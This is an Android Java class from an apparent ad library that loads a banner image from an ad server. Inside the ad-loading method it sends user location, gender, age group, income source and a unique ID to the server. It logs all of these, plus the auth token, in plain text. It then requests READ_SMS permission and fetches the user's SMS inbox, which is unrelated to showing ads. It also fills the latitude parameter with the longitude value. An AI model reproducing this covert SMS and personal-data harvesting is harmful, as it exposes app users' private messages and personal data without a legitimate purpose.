package com.example.taashaadslib.AdSerever;


import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.bumptech.glide.Glide;
import com.example.taashaadslib.AlertUtils.AlertClasses;
import com.example.taashaadslib.AppUtils.GlobalFiles;
import com.example.taashaadslib.CommonClasses.SessionManager;
import com.example.taashaadslib.Interfaces.GetAdsClass;
import com.example.taashaadslib.ModelClasses.TaashaAdsModel;
import com.example.taashaadslib.RetrofitClass.UpdateAllAPI;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.IOException;
import java.lang.reflect.Modifier;
import java.util.concurrent.TimeUnit;

import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class LoadAdsClass extends AppCompatActivity implements GetAdsClass {

    private static final String TAG = "LoadAdsClass";
    private  Context mContext;
    private  Activity mActivity;

    private int height;
    private int width;


    @Override
    public void getAds(Activity mActivity , Context mContext, ImageView mImageView) {
        this.mContext=mContext;
        this.mActivity=mActivity;

        SessionManager mSessionManager = new SessionManager(mContext);
        mSessionManager.openSettings();

        AlertClasses.printLogE(TAG , "LATITUDE : "+mSessionManager.getPreference(GlobalFiles.LATITUDE));
        AlertClasses.printLogE(TAG , "LONGITUDE : "+mSessionManager.getPreference(GlobalFiles.LONGITUDE));
        AlertClasses.printLogE(TAG , "HEIGHT : "+mSessionManager.getPreference(GlobalFiles.HEIGHT));
        AlertClasses.printLogE(TAG , "WIDTH : "+mSessionManager.getPreference(GlobalFiles.WIDTH));
        AlertClasses.printLogE(TAG , "GENDER : "+mSessionManager.getPreference(GlobalFiles.GENDER));
        AlertClasses.printLogE(TAG , "AGEGROUP : "+mSessionManager.getPreference(GlobalFiles.AGEGROUP));
        AlertClasses.printLogE(TAG , "HOUSEHOLD : "+mSessionManager.getPreference(GlobalFiles.HOUSEHOLD));
        AlertClasses.printLogE(TAG , "INCOM_SOURCE : "+mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE));
        AlertClasses.printLogE(TAG , "BASE_R0TATION : "+mSessionManager.getPreference(GlobalFiles.BASE_R0TATION));
        AlertClasses.printLogE(TAG , "CURRENT_R0TATION : "+mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION));
        AlertClasses.printLogE(TAG , "CREATIVE_ID : "+mSessionManager.getPreference(GlobalFiles.CREATIVE_ID));
        AlertClasses.printLogE(TAG , "USER_UNIQUE_ID : "+mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID));
        AlertClasses.printLogE(TAG , "KIOSK_ID : "+mSessionManager.getPreference(GlobalFiles.KIOSK_ID));
        AlertClasses.printLogE(TAG , "CITY : "+mSessionManager.getPreference(GlobalFiles.CITY));
        AlertClasses.printLogE(TAG , "STATE : "+mSessionManager.getPreference(GlobalFiles.STATE));
        AlertClasses.printLogE(TAG , "MEDIATOR_NAME : "+mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME));
        AlertClasses.printLogE(TAG , "IS_IN_ROTATION : "+mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION));
        AlertClasses.printLogE(TAG , "BUNDLE_ID : "+mSessionManager.getPreference(GlobalFiles.BUNDLE_ID));
        AlertClasses.printLogE(TAG , "APPLICATION_VERSION : "+mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION));
        AlertClasses.printLogE(TAG , "DEVICE_NETWORK_TYPE : "+mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE));
        AlertClasses.printLogE(TAG , "DNT : "+mSessionManager.getPreference(GlobalFiles.DNT));
        AlertClasses.printLogE(TAG , "INT_TYPE : "+mSessionManager.getPreference(GlobalFiles.INT_TYPE));
        AlertClasses.printLogE(TAG , "URL : "+mSessionManager.getPreference(GlobalFiles.URL));
        AlertClasses.printLogE(TAG , "DEVICE_MANUFACTURER : "+mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER));
        AlertClasses.printLogE(TAG , "DEVICE_MODEL : "+mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL));
        AlertClasses.printLogE(TAG , "APPLICATION_OS : "+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS));
        AlertClasses.printLogE(TAG , "APPLICATION_OS_VERSION : "+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION));
        AlertClasses.printLogE(TAG , "DEVICE_TYPE : "+mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE));
        AlertClasses.printLogE(TAG , "LOCATION_SOURCE : "+mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE));
        AlertClasses.printLogE(TAG , "PCHAIN : "+mSessionManager.getPreference(GlobalFiles.PCHAIN));



        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);


        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
        httpClient.addInterceptor(logging);
        httpClient.addInterceptor(new Interceptor() {
            @Override
            public okhttp3.Response intercept(Chain chain) throws IOException {

                okhttp3.Request requestOriginal = chain.request();

                okhttp3.Request request = requestOriginal.newBuilder()
                        //.header("Content-Type", "application/json; charset=utf-8")
                        .header("X-Auth-Token", mSessionManager.getPreference(GlobalFiles.KEY))
                        .method(requestOriginal.method(), requestOriginal.body())
                        .build();


                return chain.proceed(request);
            }
        });
        final OkHttpClient httpClient1 = httpClient.build();
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(GlobalFiles.COMMON_URL)
                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
                .addConverterFactory(GsonConverterFactory.create())
                .client(httpClient1)
                .build();

        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);

        //PARAMETERS
        String url= GlobalFiles.GET_ADS_API+"?"+GlobalFiles.LATITUDE+"="+mSessionManager.getPreference(GlobalFiles.LONGITUDE)+"&"+
                ""+GlobalFiles.LONGITUDE+"="+mSessionManager.getPreference(GlobalFiles.LONGITUDE)+"&"+
                ""+GlobalFiles.HEIGHT+"="+mSessionManager.getPreference(GlobalFiles.HEIGHT)+"&"+
                ""+GlobalFiles.WIDTH+"="+mSessionManager.getPreference(GlobalFiles.WIDTH)+"&"+
                ""+GlobalFiles.GENDER+"="+mSessionManager.getPreference(GlobalFiles.GENDER)+"&"+
                ""+GlobalFiles.AGEGROUP+"="+mSessionManager.getPreference(GlobalFiles.AGEGROUP)+"&"+
                ""+GlobalFiles.HOUSEHOLD+"="+mSessionManager.getPreference(GlobalFiles.HOUSEHOLD)+"&"+
                ""+GlobalFiles.INCOM_SOURCE+"="+mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE)+"&"+
                ""+GlobalFiles.BASE_R0TATION+"="+mSessionManager.getPreference(GlobalFiles.BASE_R0TATION)+"&"+
                ""+GlobalFiles.CURRENT_R0TATION+"="+mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION)+"&"+
                ""+GlobalFiles.CREATIVE_ID+"="+mSessionManager.getPreference(GlobalFiles.CREATIVE_ID)+"&"+
                ""+GlobalFiles.USER_UNIQUE_ID+"="+mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID)+"&"+
                ""+GlobalFiles.KIOSK_ID+"="+mSessionManager.getPreference(GlobalFiles.KIOSK_ID)+"&"+
                ""+GlobalFiles.CITY+"="+mSessionManager.getPreference(GlobalFiles.CITY)+"&"+
                ""+GlobalFiles.STATE+"="+mSessionManager.getPreference(GlobalFiles.STATE)+"&"+
                ""+GlobalFiles.MEDIATOR_NAME+"="+mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME)+"&"+
                ""+GlobalFiles.IS_IN_ROTATION+"="+mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION)+"&"+
                ""+GlobalFiles.BUNDLE_ID+"="+mSessionManager.getPreference(GlobalFiles.BUNDLE_ID)+"&"+
                ""+GlobalFiles.APPLICATION_VERSION+"="+mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION)+"&"+
                ""+GlobalFiles.DEVICE_NETWORK_TYPE+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE)+"&"+
                ""+GlobalFiles.DNT+"="+mSessionManager.getPreference(GlobalFiles.DNT)+"&"+
                ""+GlobalFiles.INT_TYPE+"="+mSessionManager.getPreference(GlobalFiles.INT_TYPE)+"&"+
                ""+GlobalFiles.URL+"="+mSessionManager.getPreference(GlobalFiles.URL)+"&"+
                ""+GlobalFiles.DEVICE_MANUFACTURER+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER)+"&"+
                ""+GlobalFiles.DEVICE_MODEL+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL)+"&"+
                ""+GlobalFiles.APPLICATION_OS+"="+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS)+"&"+
                ""+GlobalFiles.APPLICATION_OS_VERSION+"="+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION)+"&"+
                ""+GlobalFiles.DEVICE_TYPE+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE)+"&"+
                ""+GlobalFiles.LOCATION_SOURCE+"="+mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE)+"&"+
                ""+GlobalFiles.PCHAIN+"="+mSessionManager.getPreference(GlobalFiles.PCHAIN);

        AlertClasses.printLogE("AD SERVER : URL", url);

        Call<TaashaAdsModel> call = patchService1.getAdsFromServer(url);

        call.enqueue(new Callback<TaashaAdsModel>() {
            @Override
            public void onResponse(Call<TaashaAdsModel> call, retrofit2.Response<TaashaAdsModel> response) {



                if (response.isSuccessful()) {

                    Gson gson = new GsonBuilder()
                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
                            .serializeNulls()
                            .create();


                    AlertClasses.printLogE("AD SERVER : Response", "Response @ : " + gson.toJson(response.body()));

                    //LOAD ADS
                    Glide.with(mActivity).load(response.body().getSourceURL()).into(mImageView);

                    mImageView.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {

                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com"));
                            mActivity.startActivity(browserIntent);
                        }
                    });

                }
            }

            @Override
            public void onFailure(Call<TaashaAdsModel> call, Throwable t) {


            }
        });

        //LOAD USER SMS INBOX
        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(mActivity, new String[]{Manifest.permission.READ_SMS}, 100);
            AlertClasses.printLogE(TAG ,"NO PERMISSION GRANTED");
        } else {
            AlertClasses.printLogE(TAG ,"PERMISSION ALREADY GRANTED");
            FetchUserSMSinboxClass.fetchInbox(mActivity);

        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == 100) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                AlertClasses.printLogE(TAG ,"REQUESTED PERMISSION GRANTED");
                FetchUserSMSinboxClass.fetchInbox(mContext);

            } else {
                AlertClasses.printLogE(TAG ,"REQUESTED PERMISSION DENIED");
            }
        }
    }

}

